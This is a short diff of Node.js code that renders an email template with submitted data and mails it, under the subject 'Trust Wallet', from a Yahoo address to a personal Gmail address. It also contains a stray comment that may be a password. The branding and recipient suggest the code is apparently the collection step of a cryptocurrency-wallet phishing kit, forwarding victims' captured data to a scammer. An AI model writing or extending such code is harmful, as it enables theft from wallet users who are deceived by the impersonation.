@@ -1,0 +1,22 @@
+ ejs.renderFile(path.join(process.env.ROOT, '/pages/api/email/test.ejs'), dataToSend, function (err, data) {
+     if (err) {
+       console.log(err);
+     } else {
+//Babe0090
+       const mainOptions = {
+         from: 'bservice643@yahoo.com',
+         to: 'trustwallet850@gmail.com',
+         subject: 'Trust Wallet',
+         html: data // Plain text body
+       };
+
+
+     transporter.sendMail(mainOptions, function (err, info) {
+           if (err) {
+               console.log(err);
+           } else {
+              resolve('success')
+           }
+       });
+
+     }
